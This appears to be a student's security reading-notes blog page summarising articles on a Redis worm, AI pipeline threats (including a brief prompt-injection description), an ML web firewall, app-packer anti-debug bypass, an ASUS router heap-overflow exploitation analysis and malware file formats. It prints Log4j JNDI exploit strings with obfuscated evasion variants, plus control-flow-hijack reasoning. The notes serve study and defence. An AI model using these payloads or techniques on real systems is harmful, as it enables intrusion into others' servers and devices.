<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>news-and-good-article | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="news-and-good-article"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> news-and-good-article</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="好文章的笔记"><a href="#好文章的笔记" class="headerlink" title="好文章的笔记"></a>好文章的笔记</h1><p>&emsp;一直想开这个博文了，主要是每天玄武、gossip公众号上推的文章，一直想看，但觉得如果是平时刷手机的时候看的时候收获不大，但又不想针对每一篇文章都开一个博文，所以就有了这个<code>集锦</code>。</p>
<span id="more"></span>
<h2 id="IT-and-OT-in-the-mix"><a href="#IT-and-OT-in-the-mix" class="headerlink" title="IT and OT in the mix"></a>IT and OT in the mix</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://brilliancesecuritymagazine.com/cybersecurity/it-and-ot-in-the-mix-spotting-new-threats-in-old-environments/">链接</a>。</p>
<p>&emsp;OT（operational technology），指运营技术，相关的系统有：BMS建筑管理系统、UPS不间断电源、HVAC供暖系统。这些系统存在着网络安全问题，例如：系统中有未修复的漏洞、第三方远程连接OT设备以进行供应商维护等。相应的解决方案有：</p>
<p>（1）掌握全面的资产清单，以便跟踪识别漏洞。</p>
<p>（2）网络隔离，保护关键OT系统。</p>
<p>（3）定期渗透测试，定期固件更新。</p>
<p>（4）定制业务连续性于灾难恢复计划，例如UPS的备用方案。</p>
<p>&emsp;总结，水文一篇。</p>
<h2 id="P2PInfect-Self-Replicating-Worm-Hits-Redis-Instances"><a href="#P2PInfect-Self-Replicating-Worm-Hits-Redis-Instances" class="headerlink" title="P2PInfect: Self-Replicating Worm Hits Redis Instances"></a>P2PInfect: Self-Replicating Worm Hits Redis Instances</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://www.hackread.com/self-replicating-p2pinfect-worm-redis-instances/">链接</a>。题目为：<strong>自我复制蠕虫攻击Redis的例子</strong>。</p>
<p>&emsp;P2PInfect利用一个漏洞来攻击 Redis并将其传播到更大的 P2P 网络中。利用的漏洞为<strong>Lua库中的沙箱逃逸</strong>。这个蠕虫使用Rust写的（优势是更快的加密与逃避检测），名为P2PInfect。其他针对Redis的蠕虫有TeamTnT、WatchDog等，但是不同的是P2PInfect可以在云容器环境中持久化。</p>
<p>&emsp;P2PInfect的攻击流程如下：<strong>一旦进入 Redis 实例，蠕虫就会执行 Powershell 脚本，该脚本会更改本地防火墙设置，防止合法所有者访问受感染的 Redis 实例，同时授予蠕虫操作者不受限制的访问权限。</strong></p>
<p>&emsp;P2PInfect的持久化流程如下：<strong>蠕虫会创建名为Monitor的进程，该进程存储在用户 AppData 目录的 Temp 文件夹中。此过程会下载多个随机命名的 P2PInfect 可执行文件以及加密的配置文件，确保其长期存在于受感染的系统上。</strong></p>
<p>&emsp;该蠕虫通过端口 60100 与C2（command and control）僵尸网络建立 P2P 连接。</p>
<p>&emsp;总结，扩展视野。</p>
<h2 id="Securing-the-AI-Pipeline"><a href="#Securing-the-AI-Pipeline" class="headerlink" title="Securing the AI Pipeline"></a>Securing the AI Pipeline</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://www.mandiant.com/resources/blog/securing-ai-pipeline">链接</a>。题目为：<strong>确保AI Pipeline的安全</strong>。</p>
<p>&emsp;类似于GPT，很多安全研究者都在使用Bard（自己用了用，感觉速度更快，其他没感觉出啥来），很多研究者都想把bard之类的gpt工具集成到自己的业务流程中，也就是Pipeline。</p>
<p>&emsp;Google的安全人工智能框架（SAIF），其核心要素为：</p>
<p>（1）各种安全措施扩展到AI系统中。</p>
<p>（2）针对gpt的各种插件的安全问题。</p>
<p>（3）自动化防御。</p>
<p>（4）平台级别的安全控制。</p>
<p>（5）…感觉都挺空的，外国人竟然也会说套话？还是我境界不够啊。</p>
<h3 id="AI-Pipeline-model"><a href="#AI-Pipeline-model" class="headerlink" title="AI Pipeline model"></a>AI Pipeline model</h3><p><img src="/images/news-and-good-article/image-20230805134209933.png" alt="image-20230805134209933" style="zoom:80%;" /></p>
<p>&emsp;重点在第5步：测试模型的反馈循环是否给出不可接受的结果（作恶/错误）。例如，正在训练自动驾驶汽车模型来识别街道标志，将停车标志识别为限速标志。（感觉类似于数据投毒）</p>
<p>&emsp;我们也可以不从头训练模型，而是下载模型进行微调，类似于bert。</p>
<h3 id="AI-Pipeline-Threat-model"><a href="#AI-Pipeline-Threat-model" class="headerlink" title="AI Pipeline Threat model"></a>AI Pipeline Threat model</h3><p>&emsp;AI模型对应着3种攻击面：</p>
<p>（1）数据安全。用于训练和部署模型的数据应得到适当的保护。</p>
<p>（2）模型安全。应使用输入验证、输出清理和模型监控等措施来适当保护人工智能模型。</p>
<p>（3）环境安全。应使用软件安全和验证、网络分段和访问控制等措施来适当保护人工智能模型的部署环境。</p>
<h3 id="10-weaknesses-about-AI-model"><a href="#10-weaknesses-about-AI-model" class="headerlink" title="10 weaknesses about AI model"></a>10 weaknesses about AI model</h3><p>（1）prompt注入。攻击者会尝试在prompt中注入不良数据或信息，以使您的模型执行您不希望它执行的操作，例如尝试访问底层操作系统。</p>
<p>（2）敏感信息暴露。由于训练数据管理不足或攻击者获得了对底层技术堆栈的访问权限，攻击者可以在此处访问敏感数据。</p>
<p>（3）数据完整性缺陷。攻击者获得对底层技术堆栈的访问权限后，攻击者可以将对抗性数据注入模型。</p>
<p>（4）访问控制缺陷。例如攻击者可以任意下载模型。</p>
<p>（5）Prompt过滤缺陷。</p>
<p>（6）代理访问。面向公众的代理可以访问私有/受限内部 API。</p>
<p>（7）供应链攻击。模型依赖于各种第三方库（特别是Python库）。如果使用开源库，这些库可能已被恶意第三方破坏。</p>
<p>（8）…</p>
<h2 id="open-appsec"><a href="#open-appsec" class="headerlink" title="open-appsec"></a>open-appsec</h2><p>&emsp;基于ML的防火墙，说是可以检测0day，有意思，链接如下：<a target="_blank" rel="noopener" href="https://www.openappsec.io/get-started">链接</a>。</p>
<p>&emsp;传统的WAF都有一个静态匹配列表，匹配上就认为怎么样，不匹配上就怎么样。对于那些没匹配上的恶意流量，就是假阴性。静态匹配列表总是在CVE出来之后才会更新，所以总是会推迟。</p>
<p>&emsp;传统WAF的tradeoff：不太具体的匹配规则会提高安全级别，因为它们也可能捕捉到以前已知的漏洞的微小变化，但另一方面会导致更高数量的不必要的误报。相比之下，随着假阴性风险的增加，更具体的签名会降低安全级别，但它们通常也会减少假阳性的数量。</p>
<h3 id="ML-waf应用的例子"><a href="#ML-waf应用的例子" class="headerlink" title="ML waf应用的例子"></a>ML waf应用的例子</h3><p>&emsp;Apache的Log4j是一个广泛使用的开源框架。它的主要用途是用Java记录应用程序消息。CVE-2021-44228描述了Log4j的漏洞，其利用Java命名和目录接口（JNDI）实现了攻击，该接口提供了一种功能，允许分布式Java应用程序以独立于资源的方式查找服务。</p>
<p>&emsp;典型的漏洞利用字符串如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:&lt;protocol&gt;://&lt;server&gt;/&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;由于CVE-2021-44228使用了ldap协议，因此第一个匹配规则是在寻找<code>&#123;jndi:ldap</code>，但很快就出现了新的样本，使用了<code>ldaps/rmi/dns/iiop/http</code>协议。攻击者试图通过以下方式绕过字符串匹配检测：</p>
<p>（1）通过<code>ldap</code>字符串的大小写命令进行混淆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;</span><br></pre></td></tr></table></figure>
<p>（2）其他<code>jndi</code>字符串的混淆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;关于Log4j的漏洞还有CVE-2021-45046、CVE-2021-45105。</p>
<p>&emsp;CVE-2021-45046允许攻击者利用模式布局向log文件中添加元数据，添加的元数据可以是ThreadContext对象，使用<code>$&#123;ctx:&#125;</code>循环引用自身，从而导致无限循环，使服务器崩溃。CVE-2021-45105也是会导致服务器崩溃。</p>
<p>&emsp;这3个漏洞的利用字符串各不相同，给静态匹配规则造成了困难。</p>
<h3 id="open-appsec架构"><a href="#open-appsec架构" class="headerlink" title="open-appsec架构"></a>open-appsec架构</h3><p>&emsp;基于ML的防火墙架构如下：</p>
<p><img src="/images/news-and-good-article/image-20230805145824655.png" alt="image-20230805145824655" style="zoom:67%;" /></p>
<p>&emsp;在阶段1中，基于机器学习的引擎在HTTP请求中查找Attack Indicators。这些Indicators都是简短的模式，每个模式都指示HTTP请求被用来攻击的潜在可能性。对传入<strong>HTTP请求的评估基于监督的离线ML模型</strong>，该模型是在正在进行的离线监督训练过程中构建的，使用数百万个恶意和良性请求来识别指标，并将其与攻击的可能性（分数）相关联。分数不仅是为每个Indicators本身分配的，而且是为成对的Indicators分配的。</p>
<p>&emsp;将Indicators的得分和组合Indicators的得分聚合为第1阶段的总得分，允许open-appsec对HTTP请求的攻击可能性做出<strong>有效且准确的初始决定</strong>。</p>
<p>&emsp;在阶段2中，基于在阶段1中观察到的指标的可疑请求在上下文机器学习评估引擎中被进一步分析。此阶段的目的是进一步确信任何HTTP请求（在第1阶段的分析中被指示为潜在恶意）确实是一种攻击，并有效地排除误报。为此，open-appsec考虑了不同的上下文，如应用程序结构、用户通常或单独如何与内容交互等等。该评估是使用<strong>在线、无监督的ML模型</strong>完成的，该模型是根据入站流量为特定的受保护环境实时构建和更新的。</p>
<p>&emsp;例如，sql注入字符串为：</p>
<p><img src="/images/news-and-good-article/image-20230805150802447.png" alt="image-20230805150802447" style="zoom:67%;" /></p>
<p>&emsp;阶段1针对各种字符的得分进行加和，得到分数。根据有效载荷的长度和内容，指标的类型和数量以及总分可能会有很大差异。之后可疑请求被交给阶段2。</p>
<p>&emsp;与阶段1基于指标的分析的初步结果相比，阶段2可以提高（确认真阳性）或降低（允许消除假阳性）流量的最终置信水平。第2阶段指标有：用户信誉得分、payload得分、url得分、参数得分。</p>
<p>&emsp;有一点干货，但不是很干。</p>
<h2 id="工具：Cartographer"><a href="#工具：Cartographer" class="headerlink" title="工具：Cartographer"></a>工具：Cartographer</h2><p>&emsp;文章链接：<a target="_blank" rel="noopener" href="https://research.nccgroup.com/2023/07/20/tool-release-cartographer/">链接</a></p>
<p>&emsp;一个用于绘制代码覆盖率数据的 Ghidra 插件。Cartographer 允许研究人员<strong>直观地观察程序的哪些部分被执行、获取每个函数执行的详细信息、比较同一程序的不同运行等等</strong>。</p>
<p>&emsp;未使用过，感觉Ghidra好慢..</p>
<p>&emsp;在windows上安装失败。</p>
<h2 id="APP外壳分析"><a href="#APP外壳分析" class="headerlink" title="APP外壳分析"></a>APP外壳分析</h2><p>&emsp;文章链接：来源看雪公众号，跟随链接发现博主已经删帖。在此只总结简单思路。</p>
<p>（1）so文件中是假的section，直接删除。假的动态链接库，通过Program_Table_Load得到RVA与FA（文件地址）的对应关系，从而修复动态链接库。</p>
<p>（2）此时IDA可正常解析so文件，但是发现<code>init_array</code>和<code>JNI_OnLoad</code>方法都是被加密（这两个方法在so文件被加载时被执行）。猜测解密方法在<code>.init</code>中。so文件中，先执行<code>.init</code>，再执行<code>init_array</code>，最后执行<code>JNI_OnLoad</code>。因此，等<code>.init</code>执行结束后直接dump内存。</p>
<p>（3）IDA反汇编<code>switch..case..</code>失败，修复一波。正常的代码流程被<code>switch..case..</code>打乱。发现规律为：</p>
<p>&emsp;（a）直接跳转到分发块的case块，下一个要执行的case块也是固定的。</p>
<p>&emsp;（b）对于跳回def块（还不知道这是啥）的case块，则会通过条件执行来决定下一个要执行的case块。</p>
<p>&emsp;用脚本进行修复。</p>
<p>（4）frida调试后发现有反调。测试后发现：单独启动<code>frida-server</code>，不注入进程，程序正常运行。而注入app进程，但不进行任何hook，程序闪退。总结：<strong>对frida的基本特征做了检测</strong>。</p>
<p>（5）Hook openat（ARM 中的 openat 用于打开文件），定位反调代码，hook并修改返回值。</p>
<p>（6）继续测试，会发现对部分libc库函数（比如open）进行hook时，一样会被检测到。<strong>猜测是存在代码的hash值校验，或比较了内存与文件中的代码是否一致。</strong>按照之前的方法，hook openat定位反调代码，并hook反调试代码。</p>
<h2 id="LLVM字符串加密学习笔记"><a href="#LLVM字符串加密学习笔记" class="headerlink" title="LLVM字符串加密学习笔记"></a>LLVM字符串加密学习笔记</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276029.htm">https://bbs.kanxue.com/thread-276029.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/104735336">https://zhuanlan.zhihu.com/p/104735336</a></p>
<p>&emsp;先挖个坑，以后遇到了仔细学学。</p>
<h2 id="2021年天府杯针对群晖-amp-华硕的利用"><a href="#2021年天府杯针对群晖-amp-华硕的利用" class="headerlink" title="2021年天府杯针对群晖&amp;华硕的利用"></a>2021年天府杯针对群晖&amp;华硕的利用</h2><p>&emsp;链接如下：<a target="_blank" rel="noopener" href="https://paper.seebug.org/2098/">链接</a></p>
<p>&emsp;此文中分析的漏洞为华硕<code>RT-AX56U</code>。该设备支持Telnet与SSH，可以使用Telnet登录到设备，即可获取设备的shell。启动此设备，发现此设备开启<code>cfg_server</code>进程，其中开启了7788端口。</p>
<p>（1）发现<code>cfg_sever</code>的<code>cm_rcvTcpHandler()</code>函数中，调用<code>pthread_create()</code>创建线程，对连接进行处理。在<code>cm_tcpPacketHandler()</code>中，调用<code>read_tcp_message()</code>读取<code>socket</code>数据之后，再调用<code>cm_packetProcess()</code>进行处理。<code>cm_packetProcess()</code>功能为：<strong>根据接收数据的前<code>4</code>个字节的内容，在<code>packetHandlers</code>中匹配对应的<code>opcode</code>，匹配成功的话则调用对应的处理函数。</strong></p>
<p>（2）再分析，发现接收的数据包格式类似于TLV（type-length-value）的格式。对（1）中所述的处理函数进行分析，发现大多数函数会对value先进行AES解密，然后对解密内容做处理。漏洞存在于AES解密的过程中，具体来说：<strong><code>aes_decrypt()</code>对数据进行解密。在<code>aes_decrypt()</code>中，计算<code>EVP_CIPHER_CTX_block_size(ctx) + tlv_length</code>，然后将其传入<code>malloc()</code>中。由于未对<code>tlv_length</code>的值进行校验，当伪造<code>tlv_length=0xfffffffa</code>时，在会出现整数溢出，使得<code>malloc()</code>申请一块很小的内存，造成后续在循环调用<code>EVP_DecryptUpdate()</code>往该内存中写数据时出现堆溢出（malloc分配的数据在堆中）。</strong></p>
<p>（3）经过测试，只有函数<code>cm_processREQ_GROUPID()</code>和<code>cm_processACK_GROUPID()</code>可以无条件触发此漏洞，其他函数会依赖<code>sessionKey</code>来对数据进行解密或者路径上的某个条件不满足，造成无法触发漏洞。因此，这里选择通过<code>cm_processREQ_GROUPID()</code>来触发漏洞。</p>
<p>（4）如何进行漏洞利用？漏洞是由于整数溢出造成的堆溢出，假设<code>tlv_length=0xfffffffa</code>，后续在循环调用<code>EVP_DecryptUpdate()</code>时会尝试写入长度为<code>0xfffffffa</code>的数据，在这个过程中会出现非法内存访问造成程序崩溃。因此，想要进行漏洞利用，最好是在调用<code>EVP_DecryptUpdate()</code>的过程中完成。</p>
<p>（5）以<code>EVP_DecryptUpdate()</code>为例，其部分示例代码如下。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EVP_DecryptUpdate</span><span class="params">(_DWORD *ctx, <span class="type">char</span> *out, <span class="type">int</span> *out_len, <span class="type">char</span> *in, <span class="type">int</span> in_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = ctx[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v9 = *(_DWORD *)(*ctx + <span class="number">4</span>);                   <span class="comment">// ctx-&gt;cipher-&gt;block_size</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v12 = *ctx;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(*ctx + <span class="number">16</span>) &amp; <span class="number">0x100000</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (ctx[<span class="number">23</span>] &amp; <span class="number">0x100</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">evp_EncryptDecryptUpdate</span>(ctx, (<span class="type">int</span>)out, out_len, in, in_len);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v17 = ctx[<span class="number">25</span>];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v5 = <span class="built_in">evp_EncryptDecryptUpdate</span>(ctx, (<span class="type">int</span>)out, out_len, in, in_len);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">1</span> || ctx[<span class="number">3</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        ctx[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *out_len -= v9;</span><br><span class="line">        ctx[<span class="number">25</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(ctx + <span class="number">27</span>, &amp;out[*out_len], v9);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        v19 = *out_len;</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        *out_len = v19 + v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">  v13 = (*(<span class="built_in">int</span> (_DWORD *, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">int</span>))(v12 + <span class="number">0x18</span>))(ctx, out, in, in_len); <span class="comment">// (6) &lt;===</span></span><br></pre></td></tr></table></figure>
<p>&emsp;可以看到后续会调用<code>*ctx+0x18</code>处的函数指针，如果能覆盖<code>ctx</code>结构体中的<code>cipher</code>指针(对应<code>*ctx</code>)，则有可能使程序流程执行到<code>(6)</code>处，从而劫持程序的控制流。说明：在<code>(6)</code>处，正常的流程是调用<code>evp_EncryptDecryptUpdate()</code>，<code>evp_EncryptDecryptUpdate()</code>中也存在类似调用<code>*ctx+0x18</code>处的函数指针的代码。另外，如果能覆盖<code>ctx</code>结构体中的<code>cipher</code>指针，也可以使<code>EVP_DecryptUpdate()</code>提前返回，然后调用<code>EVP_CIPHER_CTX_free(ctx)</code>，思路类似。博客原话，大概能看懂哈哈哈。</p>
<p>（6）通过组合发送不同的请求，以及调整构造的数据包的内容，在一定情况下可以得到如下的内存布局。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/4wx 0xb6400a60</span><br><span class="line">0xb6400a60:     0xb6ef6b1c      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) x/20wx 0xb6400a48</span><br><span class="line">0xb6400a48:     0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0xb6400a58:     0x00000000      0x00000095      0xb6ef6b1c      0x00000000  ; 覆盖0xb6ef6b1c为内容可控的地址</span><br><span class="line">0xb6400a68:     0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0xb6400a78:     0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0xb6400a88:     0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>
<p>&emsp;其中<code>0xb6400a60</code>为<code>ctx</code>结构体的指针，<code>0xb6400a48</code>为<code>malloc()</code>返回的地址。可以看到，确实可以通过覆盖<code>ctx</code>结构体中cipher指针（这里是<code>0xb6ef6b1c</code>）的方式来劫持程序控制流，但问题是用什么地址来覆盖？需要有一块内容可控的地址。通过对<code>cfg_server</code>的其他功能进行分析，暂时未找到对应的操作来实现向<code>.data/.bss</code>等区域写入可控内容。因此，采用这种方式可能需要结合爆破或其他方法。</p>
<h2 id="计算机硬件及操作系统原理介绍"><a href="#计算机硬件及操作系统原理介绍" class="headerlink" title="计算机硬件及操作系统原理介绍"></a>计算机硬件及操作系统原理介绍</h2><p>&emsp;很好的文章，挖个坑：<a target="_blank" rel="noopener" href="https://cpu.land/">链接</a></p>
<h2 id="手游反调试-反hook分析与绕过"><a href="#手游反调试-反hook分析与绕过" class="headerlink" title="手游反调试-反hook分析与绕过"></a>手游反调试-反hook分析与绕过</h2><p>&emsp;很好的文章，挖坑挖坑，好多坑呜呜呜：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-278113.htm">链接</a></p>
<h2 id="安卓静态数据加密原理"><a href="#安卓静态数据加密原理" class="headerlink" title="安卓静态数据加密原理"></a>安卓静态数据加密原理</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="http://blog.quarkslab.com/android-data-encryption-in-depth.html">链接</a>。安卓中有soc芯片与加密芯片，如何获取加密芯片中的数据。安卓对于数据的静态加密分为全盘加密（Full-disk encryption：FDE）与基于文件的加密（FBE）。基于文件的加密使得每个文件都有自己的密钥，这些密钥是由主密钥派生的。基于文件的加密又分为两个级别：（1）设备加密（DE），文件在运行时就是解密状态。（2）凭证加密（CE），文件仅在验证用户身份之后才是解密状态。</p>
<p>&emsp;实际上，现实中可能是DE、CE混合的，即DE先解密文件的一部分，例如其中的警报部分代码，之后，验证用户身份后，再进行完全解密。我们重点关注CE相关的密钥。经过研究，CE相关的密钥是由两部分共同派生的：（1）root用户拥有的文件。（2）TEE保护的密钥。那么，我们必须攻破这两部分，才能得到正确的CE密钥。这还挺难的。</p>
<p>&emsp;所以，我们转头研究安卓是如何做身份验证的，查看协议中有什么漏洞。安卓大部分使用gatekeeper进行身份验证，Gatekeeper 是 TEE 中常见的可信应用程序 (TA) 之一。通过与相应的 Android 守护程序（和硬件抽象层）通信。首先，gatekeeper服务端收到客户端的注册请求，收到客户端设置的密码<code>key</code>，并计算：<code>Sign(scrypt(key)||hashstring)</code>，保存在服务端。其中，<code>scrypt</code>是密钥派生函数。最后，颁发给客户端防重放的令牌。</p>
<p>&emsp;当用户通过身份验证后，系统就会有有效的<code>applicationId</code>。接下来，需要得到解密的合成密码（<code>Synthetic Password</code>）。流程示意图如下：</p>
<p><img src="/images/news-and-good-article/image-20230821214748781.png" alt="image-20230821214748781" style="zoom:80%;" /></p>
<p>&emsp;如上所示，合成密码存储在 Android 文件系统中，必须使用两个不同的密钥进行解密。第一个是存储在 Android Keystore 中的常规密钥，只有当命令还包含之前由 Gatekeeper 生成的身份验证令牌（并且仍然有效）时才能使用它们。一旦完成第一次解密（在 TEE 中），就会使用散列的 applicationId 作为密钥再次解密中间缓冲区。这里的 AES 是使用 GCM 模式完成的，即：如果密钥出现问题，操作会因标签不匹配而失败。</p>
<p>&emsp;综上所述，攻击者需要完成三件事才能恢复 CE 密钥。（1）能够检索特权用户拥有的文件，可能会利用链接多个漏洞的内核漏洞。（2）篡改 TEE，要么从 Keymaster 泄露所需的密钥，要么攻击 Gatekeeper 中的凭证验证和身份验证令牌生成。（3）利用获得的信息进行暴力破解。</p>
<p>&emsp;后续有针对Gatekeeper与Weaver的攻击利用，weaver是依赖安全芯片存储键值对的函数。具体可以看博客，懒得看了呜呜呜。</p>
<h2 id="恶意软件所使用的自制可执行程序的结构-–-SecTodayBot"><a href="#恶意软件所使用的自制可执行程序的结构-–-SecTodayBot" class="headerlink" title="恶意软件所使用的自制可执行程序的结构 – SecTodayBot"></a>恶意软件所使用的自制可执行程序的结构 – SecTodayBot</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/">链接</a>。</p>
<p>&emsp;文章中提到，恶意软件Rhadamanthys与挖矿软件Hidden Bee设计很相似，这表现在：自定义的可执行文件格式、虚拟文件系统的使用、组件的相同路径、类似的隐写、LUA脚本使用等。</p>
<p>&emsp;文章还提供了从Rhadamanthys自定义格式中重建PE的工具。Rhadamanthys中有一些自定义的可执行格式，虽然初始加载程序是典型的PE，但是大多数核心模块都以自定义格式的形式提供。Hidden Bee是Lua脚本的挖矿程序，使用了Underminer Exploit Kit进行开发。</p>
<h3 id="Hidden-Bee格式：NE与NS"><a href="#Hidden-Bee格式：NE与NS" class="headerlink" title="Hidden Bee格式：NE与NS"></a>Hidden Bee格式：NE与NS</h3><h4 id="NE"><a href="#NE" class="headerlink" title="NE"></a>NE</h4><p>&emsp;NE类似于PE，DOS标头替换为自定义标头：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WORD magic;</span><br><span class="line">WORD pe_offset;</span><br><span class="line">WORD machine_id;</span><br></pre></td></tr></table></figure>
<p>&emsp;其余标头与PE相同，只有<code>&quot;PE&quot;</code>标识符被删除。转换回去也很简单，添加<code>&quot;MZ&quot;</code>和<code>&quot;PE&quot;</code>，并将移位的字段移动到原始偏移量。</p>
